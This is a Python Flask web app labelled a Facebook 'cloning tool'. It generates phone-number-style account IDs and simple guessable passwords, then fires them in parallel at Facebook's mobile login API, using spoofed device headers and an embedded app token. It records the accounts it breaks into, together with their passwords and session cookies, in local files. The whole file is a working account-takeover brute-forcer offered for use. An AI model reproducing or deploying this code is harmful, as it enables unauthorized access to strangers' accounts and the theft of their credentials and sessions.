import os
from flask import Flask, request, jsonify
import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor as tred
import uuid
import sys
from fake_useragent import UserAgent

app = Flask(__name__)
ua = UserAgent()

# Your previous code here...

@app.route('/')
def home():
    return '''
    <html>
    <body>
    <h2>Welcome to MR.DIPTO's Web-Based FB Cloning Tool</h2>
    <form action="/clone" method="post">
        SIM Code: <input type="text" name="sim_code"><br>
        Limit: <input type="text" name="limit"><br>
        <input type="submit" value="Start Cloning">
    </form>
    </body>
    </html>
    '''

@app.route('/clone', methods=['POST'])
def clone():
    sim_code = request.form['sim_code']
    limit = int(request.form['limit'])

    user = []
    for _ in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)

    with tred(max_workers=30) as Dipto:
        tl = str(len(user))
        for psx in user:
            ids = sim_code + psx
            passlist = [psx, ids, ids[:7], ids[:6], ids[5:], ids[4:], 'sadiya', 'jannat']
            Dipto.submit(method_crack, ids, passlist)
    
    return jsonify({
        "status": "Cloning initiated",
        "total_accounts": len(user)
    })

def method_crack(ids, passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            datax = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header = {'User-Agent': ua.random, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url = 'https://api.facebook.com/method/auth.login'
            reqx = requests.post(url, data=datax, headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid = reqx['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[PING-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki = ";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/PING-OK.txt', 'a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[PING-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/PING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop += 1
    except:
        pass

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
